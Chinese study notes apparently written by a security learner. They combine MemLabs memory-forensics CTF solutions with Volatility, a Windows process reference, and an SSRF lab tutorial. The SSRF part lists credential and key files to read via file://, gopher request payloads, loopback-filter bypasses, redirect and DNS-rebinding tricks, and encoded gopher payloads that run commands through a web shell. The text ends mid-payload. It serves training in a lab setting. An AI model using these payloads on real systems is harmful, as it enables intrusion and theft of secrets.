
![image-20231203200132888](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200132888.png)

使用`gimp`打开文件并调整位移、高度、宽度，最后垂直翻转一下即可还原图片

![image-20231203200650560](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200650560.png)

##### 2.2.2.4 Flag3

现在就剩下最后一个Flag了，通过分析进程可知还有一个压缩包进程，那么尝试拿到这个压缩包文件

通过`cmdline`来查看进程程序的启动路径和参数，成功找到操作的文件对象

![image-20231203200903271](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200903271.png)

全盘搜素这个文件并下载

![image-20231203201032186](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201032186.png)

file 命令分析一下确实是一个压缩文件，解压缩的时候发现需要密码

![image-20231203201125807](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201125807.png)

压缩软件打开能看到密码的提示信息，密码是`Alissa`用户的NTLM哈希值大写，那么直接用`hashdump`就可以了

![image-20231203201335804](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201335804.png)

#### 2.2.3 MemLabs Lab 2

> 1.挑战说明
> 我们公司的一位客户由于未知错误而失去了对其系统的访问权限。 据推测，他是一位非常受欢迎的“环保”活动家。 作为调查的一部分，他告诉我们他的应用程序是浏览器，他的密码管理器等。我们希望你能深入这个内存转储并找到他的重要资料并将其归还给我们。
>
> 注意：此挑战由3个flag组成
>
> 靶机地址：https://github.com/stuxnet999/MemLabs/tree/master/Lab%202

##### 2.2.3.1 初步分析

关键进程：

`cmd`：命令行

`KeePass.exe`：密码管理器

`chrome.exe`：谷歌浏览器

![image-20231203215111534](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215111534.png)

##### 2.2.3.2 Flag1

首先先用`psscan`和`pslist`做一个初步分析

![image-20231203214350115](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214350115.png)

既然看到了`cmd.exe`那么就做一个常规查看咯！这里用`consoles`没有查看到什么有用的东西，`cmdscan`看到两个进程

![image-20231203214732996](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214732996.png)

这里我实在想不通到底是基于怎样的逻辑去看环境变量的；解码这串base64值拿到第一个flag：`ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9`

![image-20231203214830472](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214830472.png)

##### 2.2.3.3 Flag2

分析描述信息得到两个关键字：浏览器、密码管理器，那么首先想到`iehistory`

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/b461b194a7bc51751190430f56712aeb.png)

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/bd1545fa858fc4c5402898a240c43966.png)

全盘文件搜素这些文件，能够找到：`Password.png`还有`Hidden.kdbx`

![image-20231203215501282](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215501282.png)

首先先转存`Password.png`文件，查看这个文件可以看到密码

![image-20231203215813915](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215813915.png)

再转存`Hidden.kdbx`，这个程序应该要用KeyPass打开，这里我没做，输入上面的密码就可以打开，然后拿到Flag

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/b5647cf3c5dd716ae6a41e14fbaf2a1d.png)

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1c5eeb9d9a4e8b631987642124ed2062.png)

##### 2.2.2.4 Flag3

查看Google浏览器的历史记录，这里需要额外加载插件

此处使用外部插件`chromehistory.py` 链接：`https://github.com/superponible/volatility-plugins`，发现可疑链接，访问就能拿到一个压缩包，解压密码为Lab-1中第三阶段Flag的sha1，且为小写。第三阶段Flag为：flag{w3ll_3rd_stage_was_easy}；密码为：`6045dd90029719a039fd2d2ebcca718439dd100a`

![image-20231203220101350](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203220101350.png)

#### 2.2.4 MemLabs Lab 3

> **挑战描述**
>
> 一个恶意脚本加密了我系统上一条非常机密的信息。你能帮我恢复信息吗？
>
> 注意：此挑战仅由1个标志组成，并分为2个部分。 提示：您需要标志的前半部分才能获得第二半部分。 您将需要这个额外的工具来解决挑战， 
>
> ```
> $ sudo apt install steghide
> ```

##### 2.2.4.1 初步分析

老规矩，先使用`pslist`和`psscan`来分析一下发生了什么，这里要把不知道的进程都查一次，首先可以看到有两个python进程，按照上一题的思路想看一下python进程的环境变量的。但是看不到

![image-20231203224722459](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203224722459.png)

![image-20231203224938621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203224938621.png)

##### 2.2.4.2 Flag1

通过描述可以知道，是恶意脚本加密了信息。那么就可以认定这个脚本是一个python脚本了；这里可以使用`cmdline`来看看程序的执行参数，发现了两个可疑文件

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/136763985db7524d0b46dac8eda951f2.png)

全盘扫描并转存下来分析

![image-20231203225206557](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225206557.png)

转存`evilscript.py`文件到本地并改名

![image-20231203225312495](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225312495.png)

![image-20231203225337363](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225337363.png)

这里贴一下脚本代码；整个脚本的意思是将输入的字符串逐位与数字3做一次异或运算，最后再全体做一次base64编码；然后写入`vip.txt`文件

```py
import sys
import string

def xor(s):
    a = ''.join(chr(ord(i)^3) for i in s)
    return a


def encoder(x):
    return x.encode("base64")


if __name__ == "__main__":
    f = open("C:\\Users\\hello\\Desktop\\vip.txt", "w")
    # sys.argv 是一个包含命令行参数的列表；sys.argv[0] 是脚本名（即被执行的脚本文件的路径），sys.argv[1] 到 sys.argv[n] 是传递给脚本的参数
    arr = sys.argv[1]
    arr = encoder(xor(arr))
    f.write(arr)
    f.close()
```

这里转存`vip.txt`文件并查看内容可以看到密文：`am1gd2V4M20wXGs3b2U=`

![image-20231203225725179](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225725179.png)

既然如此，那么将脚本思路逆过来，先做一次base64解码，再逐位与数字3做一个异或运算就可以拿到明文，解密脚本如下：

```py
from base64 import b64decode

src = b64decode("am1gd2V4M20wXGs3b2U=").decode('utf-8')

res = ''
for i in src:
    res += ''.join(chr(ord(i) ^ 3))

print(res)

# 输出：
inctf{0n3_h4lf
```

##### 2.2.5.2 Flag2

通过提示知道需要用到`steghide`工具，该工具主要是对图片文件做隐写；利用这个思路全盘扫描图片文件

```
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab3.raw --profile=Win7SP1x86_23418 filescan |grep -E "jpg|jpeg|bmp|png"  
```

![image-20231203230058821](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230058821.png)

直觉看上去`suspision1.jpeg`比较像，尝试解压一下，输入前半部分的flag当密码可以看到里面有一个`secret.txt`的文本文件

![image-20231203230304534](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230304534.png)

直接解压出来，可以看到后半部分的Flag

![image-20231203230412811](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230412811.png)

#### 2.2.5 MemLabs Lab 4

> **挑战说明**
>
> 我的系统最近遭到入侵。黑客窃取了很多信息，但他也删除了我的一个非常重要的文件。我不知道如何恢复它。目前，我们唯一的证据就是这个内存转储。请帮帮我。
>
> 注意：此挑战仅由1个标志组成。 
>
> 本练习的标志格式为：inctf{s0me_l33t_Str1ng}
>
> 靶机地址：https://github.com/stuxnet999/MemLabs/tree/master/Lab%204

##### 2.2.5.1 初步分析

explorer管理了 Windows的任务栏，资源管理器，文件窗口，并且大部分桌面程序都是explorer的子进程；即，我们在调用文件资源管理器来访问文件的时候都会用到这个进程，而且我们可以直接用`iehistory`来查看访问了哪些文件

**以后凡是看到`explore.exe`这个进程都给我去看`iehistory`**

![image-20231204155340348](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204155340348.png)

##### 2.2.5.2 Flag1

一开始排查了很多东西到找不到线索，用`iehistory`可以看到一些可疑文件

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/cb35e372d13160bd511114205340d844.png)

使用`dumpfiles`在转载的时候全部都转不出来，描述说的是被删了；

对于NTFS文件系统，会有一个MFT表，单位为1024字节（1K），对于小于或等于1024字节的文件，NTFS会直接将这个文件记录到MFT表中；对于大于1024字节的文件，则会记录这个文件存储位置；即使删除了该文件，也只是将这个MFT条目标记为**可用（可覆盖）**，那么如果还没有被覆盖，就可以还原

使用`mftparser`来查看内存镜像的MFT表

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser > mft.txt 
```

排查上面的可疑文件，在`important`关键字处找到Flag

![image-20231204160421910](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204160421910.png)

#### 2.2.6 MemLabs Lab 5

> **挑战说明**
>
> 我们最近从客户那里收到了这个内存转储。有人在他不在时访问了他的系统，他发现正在访问一些相当奇怪的文件。 找到这些文件，它们可能很有用。我引用他的确切陈述，名字不可读。 它们由字母和数字组成，但我无法弄清楚它到底是什么。此外，他注意到他最喜欢的应用程序每次运行时都会崩溃。 是病毒吗？
>
> 注 1：此挑战由 3 个Flag组成。 如果您认为第二个标志是结束，它不是！
>
> 注 2：挑战时有一个小错误。 如果您发现任何具有字符串“L4B_3_D0n3!!”的字符串 在里面，请把它改成“L4B_5_D0n3!!” 然后继续。
>
> 注 3：只有在拥有第一阶段标志时，您才会获得第二阶段标志。

##### 2.2.6.1 初步分析

老规矩。`psscan`和`pslist`都一下，发现一些可疑进程

![image-20231204164540889](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204164540889.png)

这里例举一下可疑进程

```bash
0x000000003e81ab30 NOTEPAD.EXE        1388   1580 0x00000000345fd000 2019-12-20 03:48:00 UTC+0000 
0x000000003fce8060 WerFault.exe       2716   2632 0x0000000033753000 2019-12-20 03:47:54 UTC+0000 
0x000000003fd97a20 WinRAR.exe         2924   1580 0x0000000023174000 2019-12-20 03:47:13 UTC+0000  
```

##### 2.2.6.2 Flag1

上一个关卡踩的坑，看到`explore.exe`首先检查`iehistory`，发现了下面这些可疑文件；Base64解码下面那一串字符串拿到第一个Flag

```bash
file:///C:/Users/Alissa%20Simpson/Documents/Important.rar
file:///C:/Users/Alissa%20Simpson/Downloads/SW1wb3J0YW50.rar		# Important.rar
file:///C:/Users/Alissa%20Simpson/stAg3_5.txt
file:///C:/Users/Alissa%20Simpson/Pictures/Password.png
file:///C:/Users/SmartNet/Documents/New%20Text%20Document.txt
file:///C:/Users/SmartNet/Secrets/Hidden.kdbx
file:///C:/Users/Alissa%20Simpson/Pictures/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ.bmp	# flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}
file:///C:/Users/SmartNet/Desktop/St4g3$1.bat.txt
file:///C:/Users/SmartNet/Documents/New%20Text%20Document.txt
```

##### 2.2.6.3 Flag2

既然有`WinRAR.exe`进程，那么惯例肯定也是要把这个压缩包找出来的，上面找到了好几个压缩包文件名，全盘搜素一下，这里找到了`SW1wb3J0YW50.rar`文件

![image-20231204165047119](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165047119.png)

转存下来解压缩就可以发现第二个Flag，压缩包需要密码，尝试用第一条Flag解压成功，拿到下面一张图片

![image-20231204165149239](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165149239.png)

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165227755.png" alt="image-20231204165227755" style="zoom:50%;" />

##### 2.2.6.4 Flag3

根据描述信息，我第一反应是想办法将`WerFault.exe`报错的内容弄出来看；但是我用`procdump`存下来也打不开，这里因为需要二进制的知识了，直接贴吧

4.1 使用pstree发现可疑进程 NOTEPAD.EXE

vol.py -f /root/Desktop/memlabs/lab5/MemoryDump_Lab5.raw --profile=Win7SP1x64 pstree

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/f59a48903bf49e1bb6a962a06670ec89.png)

4.2 尝试提取Pid为2724和2056的程序，只有2724提取成功

vol.py -f /root/Desktop/memlabs/lab5/MemoryDump_Lab5.raw --profile=Win7SP1x64 procdump -p 2724 -D ../memlabs/lab5

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/2a8b293f45d746eff2491c3ded70b704.png)

4.3 使用IDA进行分析，取到Flag3，即bi0s{M3m_l4b5_OVeR_!}

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/2a963b896d4f9230b6dcbb482bdd6e85.png)

## 3. Windows 常见进程

在内存取证的时候经常会看到许多不认识的进程，这里将搜索过的进程做一个记录

```bash
SearchIndexer.exe					# 系统进程：Windows系统自带的文件搜索进程
smss.exe							# 系统进程：负责初始系统变量和启动用户会话（易被病毒利用）
wininit.exe							# 核心进程：负责Windows初始化（易被病毒利用）
services.exe						# 系统进程：管理、启动和重启服务（易被病毒利用）
lsass.exe							# 系统进程：用户明文会已明文的方式存储在这个进程中（易被病毒利用）
lsm.exe								# 系统进程：用户管理用户会话（易被病毒里利用）
svchost.exe							# 系统进程：动态链接库（DLL）中运行的服务的通用主机进程名称（易被病毒利用）
VBoxService.ex						# 程序进程：Virtual Box进程
VBoxTray.exe 						# 程序进程：属于Virtual Box程序的一部分
audiodg.exe 						# 系统进程：管理Windows系统音频程序
spoolsv.exe							# 系统进程：打印服务，管理所有本地和网络打印队列及控制所有打印工作
taskhost.exe						# 系统进程：Windows计划任务进程
taskeng.exe							# 系统进程：负责任务计划的执行和创建
sppsvc.exe							# 系统进程：用于检测安装和Windows应用程序的数字许可证
dwm.exe								# 系统进程：桌面窗口管理器，负责管理图形用户界面，如：透明窗口和任务栏缩略图
explorer.exe						# 核心进程：Windows资源管理器。包括开始菜单、任务栏、通知区域和文件资源管理器
conhost.exe							# 程序进程：命令行程序的宿主进程
DumpIt.exe							# 程序进程：DumpIt 程序用来封装系统的内存文件以作后续分析
csrss.exe							# 系统进程：主要管理Windows图形化相关的系统任务
TCPSVCS.EXE							# 系统进程：用于计算TCP/IP网络服务
wmpnetwk.exe						# 系统基础：Windows Media Player 网络共享服务
mspaint.exe							# 程序进程：Windows 画图程序的进程
winlogon.exe						# 系统进程：负责执行与Windows登录过程相关的一些重要任务
WmiPrvSE.exe | WmiApSrv.exe 		# 系统进程：帮助应用程序有关当前系统的各种信息
dllhost.exe							# 系统进程：用于管理DLL任务
KeePass.exe							# 程序进程：一个密码管理器
LogonUI.exe							# 系统进程：在登录时运行，用于构建并显示开机时的”欢迎“，密码输入、关机等界面
msiexec.exe							# 系统进程：主要用于Windows更新
TrustedInstall						# 系统进程：主要负责运行、安装、更新和卸载Windows系统组件
GoogleCrashHandler.exe				# 程序进程：包管理系统，可以下载、安装、删除和自动更新Google应用程序
StikyNot.exe 						# 程序进程：Windows系统的 Sticky Notes（便筏应用程序）
WerFault.exe						# 程序进程：Windows错误报告服务（WerSrv）的一部分，监视Windows和正在运行的应用程序状态。如果在启动应用程序时发生错误数据都会自动生成，则WerFault.exe进程将自动启动并手机错误报告数据
vmacthlp.exe | VGAuthService.exe	# 程序进程：是VMware Tools 软件包的一部分
msdtc.exe							# 系统进程：是 Windows 系统的一部分，具体来说是 Microsoft Distributed Transaction Coordinator (MSDTC) 服务的一部分。这项服务允许多个客户端应用程序在一个事务中包含多个不同的数据源。
BitTorrent.exe						# 程序进程：Torrent下载软件
MsMpEng.exe							# 程序进程：Win10 内置杀毒软件
msdtc.exe							# 系统进程：MSDTC 是 Windows 操作系统中的一个服务，用于支持分布式事务处理
NisSrv.exe							# 系统进程：与 Windows Defender（Microsoft Defender Antivirus）有关
sihost.exe							# 系统进程：是 Windows 桌面体验中的一个关键组件。它负责运行一些与用户界面、Windows资源管理器和任务栏相关的元件。
userinit.exe						# 系统进程：该进程负责初始化用户的登录会话。它在用户登录时运行，并负责执行一系列初始化任务，以确保用户会话的正确启动。
RuntimeBroker.exe					# 系统进程：充当应用程序与操作系统之间的中间代理，负责处理应用程序的权限请求、系统资源访问等。它确保应用程序在运行时获得适当的权限，同时限制其对系统资源的访问。
ChsIME.exe							# 系统进程：是输入法引擎的一部分，负责处理中文输入法的相关功能。
ShellExperienceHost.exe				# 系统进程：负责处理用户界面和桌面用户体验的相关功能
SearchUI.exe						# 系统进程：它与 Cortana 集成，允许用户在开始菜单或任务栏中进行搜索操作
ApplicationFrameHost.exe			# 系统进程：负责运行一些现代 UI 应用程序
SearchProtocolHost.exe				# 系统进程：负责执行搜索操作，包括文件和应用程序搜索
SearchFilterHost.exe				# 系统进程：负责处理搜索过滤器和索引策略。它帮助加快文件搜索的速度，提高搜索效率。
wscantfy.exe						# 系统进程：是 Windows 安全相关策略的一部分，属于系统进程。它主要用于监测电脑上的防火墙、自动更新及杀毒软件。如果用户未开启防火墙、关闭了自动更新或未安装杀毒软件，那么这个进程就会在任务栏提示用户，弹出 Windows 警报
conime.exe							# 系统进程：它是输入法编辑器相关的程序。这个进程允许用户使用标准键盘输入复杂的字符和符号。然而，它也可能是一个 bfghost1.0 远程控制后门程序。此程序允许攻击者访问你的计算机，窃取密码和个人数据。
aleg.exe							# 系统进程：充当一种防火墙，可以对网络流量提供应用程序级别的控制。当受信任网络上的用户打算连接到不受信任网络（如Internet）上的服务时，该应用被引导至防火墙中的代理服务器。
wuault.exe							# Wubdiws 自动
```



# SSRF 漏洞

> 国光老师SSRF靶场Dockers环境：https://github.com/Duoduo-chino/ssrf_vul

## 1. SSRF信息搜集

### 1.1 伪协议

`file://`：从文件系统中获取文件内容，如：`file:///etc/passwd`

`dict://`：字段服务协议，访问字典资源，如：`dict://ip:6739/info`

`ftp://`：可用于网络端口扫描

`sftp://`：SSH 文件传输协议或安全文件传输协议

`ladp://`：轻量级目录访问协议

`tftp://`：简单文件传输协议

`gopher://`：分布式文档传输服务

#### 1.1 `file://` 

> file:// 从文件系统中获取文件内容，格式为 file://[文件路径]

`file:///etc/passwd`：读取文件passwd

`file:///etc/hosts`：显示当前操作系统网卡的IP

`file:///proc/net/arp`：显示arp缓存表（寻找内网其他主机）

`file:///proc/net/fib_trie`：显示当前网段路由信息

```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //root的bash历史记录
/root/.ssh/authorized_keys
/root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts // 挂载的文件系统列表
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存
/proc/version // 内核版本
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
ssh
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
```

#### 1.2 `file://` 配合 `http://` 扫描内网

1）首先，我们需要可以访问到服务器的ARP文件

**Tips：**这里使用作者的源码读不到`/proc/net/arp`文件，我也不知道为什么，后面我是进去把源码改了，直接用`file_get_contents`做的

![image-20240220205430711](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220205430711.png)

2）内网基本上就是C段地址了，这里也可以大胆猜测一下；然后使用`http://`协议来尝试对这个C段的所有地址都发一次链接

**Tips：**这里可以使用python脚本或者Burp Suite来

![image-20240220205732278](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220205732278.png)

![image-20240220210038934](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220210038934.png)

3）以此在回来看ARP表就可以达到内网扫描的目的

**Tips：**之所以有很多全0的MAC 地址就是因为这些主机不存在导致没有响应报文回复，此时服务器以全0替代；即不是全0的MAC 地址就是存活主机

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220210139265.png" alt="image-20240220210139265" style="zoom: 67%;" />

#### 1.3 `dict://` 扫描内网资源

格式：`dict://ip:port`，这里模式要选择`Cluster bomb`

**Tips：**这一步`ftp://`一样能做到，但是相比之下，`dict://`扫描效率就高很多

![image-20240220212038843](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220212038843.png)

![image-20240220213241036](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220213241036.png)

#### 1.4 `http://` 目录扫描

再通过上面的步骤拿到存活主机和内网资源信息之后，就可以通过使用`http://`来对内网的web服务器做目录扫描，这里一样可以使用Burp Suite来完成；这里直接贴上效果图

![image-20240220213701099](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220213701099.png)

#### 1.5 `gopher://`

##### 1. 基本使用

```
基本格式：gopher://<host>:<port>/<gopher-path>
```

**Tips：**由于`gopher`伪协议默认端口为70，所以在发送HTTP请求的时候需要改成80端口

这里演示一下gopher协议的基础使用，首先使用`nc`监听70端口

![image-20240220215711015](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220215711015.png)

然后使用`curl`搭配gopher伪协议向70端口发送信息，由于`gopher`伪协议默认回吃掉第一个字符，所以这里需要加上一个无用的字符

![image-20240220215804386](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220215804386.png)

![image-20240220215840669](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220215840669.png)

##### 2. GET 提交

**Tips：**一个HTTP GET 头部必须包含下面的两条字段，*且每个字段后面必须跟一个回车*，（结尾要跟两个回车）

```
GET /name.php HTTP/1.1
Host: 172.72.23.22:8080

```

那么按照这个格式来填充信息，如下：

```
gopher://172.72.23.22:80/_GET%20/name.php%3fname=lulu%20HTTP/1.1%0d%0AHost:%20172.72.23.22%0d%0A
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A
```

**URL编码：**

`%20`：空格

`%3f`：问号

`%0d%0A`：换行符

**注意：**

+ 端口号80和填充为`_`
+ 问号`?`需要转码为URL编码，也就是`%3f`
+ 回车换行要变为`%0d%0a`，如果直接用工具转，可能只是`%0a`
+ 在HTTP包的最后要添加`%0d%0a`，代表消息结束（具体可研究HTTP包结束）
+ URL编码改为大写，冒号注意英文冒号
+ 如果使用BP发包需要进行两次URL编码
+ GET请求最后需要

##### 3. POST 提交

**Tips：**一个POST头部必须包含下面4个字段，且包含提交的数据；**HOST 端口号不要省！！！**

```
POST /name.php HTTP/1.1
Host: 172.72.23.22:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

name=jianjian

```

那么按照这个格式填充，如下：

```
gopher://172.72.23.22:80/_POST%20/name.php%20HTTP/1.1%0d%0AHost:%20172.72.23.22%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2013%0d%0A%0d%0aname=jianjian%0d%0A
```

## 2. SSRF 之换回地址绕过

IP地址的表现形式：

```
··127.0.0.1												# 点分十进制
0b 01111111000000000000000000000001						# 数据包中实际是32为bit，没有点
0  17700000001											# 八进制
0x 7F000001												# 十六进制
2130706433												# 十进制
```

以此转换：

```
http://0b01111111000000000000000000000001/flag
http://017700000001/flag
http://0x7F000001/flag
http://2130706433/flag
```

## 3. SSRF 之302重定向绕过

背景：服务器有SSRF漏洞但是不允许访问私有地址。

此时，我们就可以利用这个SSRF漏洞访问我们的公网服务器，公网服务器的内容如下，利用`Location`让服务器主动访问自己的flag文件

```php
<?php
header('Location: http://127.0.0.1/flag.php');
```

![image-20240423161330664](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423161330664.png)

这里由于用国光的Docker环境做失败了，就直接在本地做了

```php
# test.php
<?php
highlight_file(__FILE__);
header('Location: http://127.0.0.1/flag.php');

# test1.php
<?php
highlight_file(__FILE__);
echo file_get_contents($_GET['name']);
```

![image-20240423161654492](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423161654492.png)

现实中只要把`test.php`放到公网即可，届时就可以利用SSRF漏洞访问服务器的敏感文件

## 4. SSRF 之DNS重绑定攻击

> 参考：https://xz.aliyun.com/t/8707?time__1311=n4%2BxuDgDBD9G0%3DG8DRDAx05DIdg18OQr33rY4D&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F

### 4.1 传统SSRF过滤流程

1. 获取到输入的URL，从该URL中提取host
2. 对该host进行DNS解析，获取到解析的IP
3. 检测该IP是否是合法的，比如是否是私有IP等
4. 如果IP检测为合法的，则进入curl的阶段发包

从DNS解析的角度来看，这个过程一共有两次解析，第一次是`对该host进行DNS解析`，第二次是`进入curl的阶段发包`，这两次请求之间存在一个时间差，如果我们能够修改DNS地址在第一次请求的时候为合法地址，第二次请求时为恶意地址，就可以绕过这个检测了。（说白了就是在第四步这里没有使用DNS解析拿到的IP地址，而是用URL再做一次DNS请求，而这次DNS请求变成了一个恶意地址）

简单理一下这个过程：

1. 攻击者配置了一台DNS服务器用于解析某域名
2. 每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址
3. 当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用

当然有师傅会觉得比较麻烦，还需要搭DNS服务器啥的，这里提供两个方式可以降低利用复杂度。不需要自己去搭建一个DNS服务器来进行利用，可以使用一些平台来构造。

1. http://ceye.io/
2. https://lock.cmpxchg8b.com/rebinder.html

目标：访问`http://127.0.0.1/flag.php`，这里A和B要求一个是私网地址一个是公网地址（顺序没有要求）

![image-20240423164630619](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423164630619.png)

![image-20240423164739617](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423164739617.png)

## 5. SSRF 之命令执行

如果是GET的话，直接使用`http://`就行，如果是POST，就要用`gopher://`

```
# GET 提交
url=gopher://172.72.23.22:80/_%25%34%37%25%34%35%25%35%34%25%32%30%25%32%66%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%33%66%25%36%33%25%36%64%25%36%34%25%33%64%25%36%63%25%37%33%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%32%25%30%64%25%30%61

url=gopher://172.72.23.22:80/_GET /shell.php?cmd=ls HTTP/1.1
Host: 172.72.23.22

```

![image-20240423183111626](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423183111626.png)

```
# POST 提交
%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%39%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%39%25%36%34%25%33%62%25%36%63%25%37%33%25%3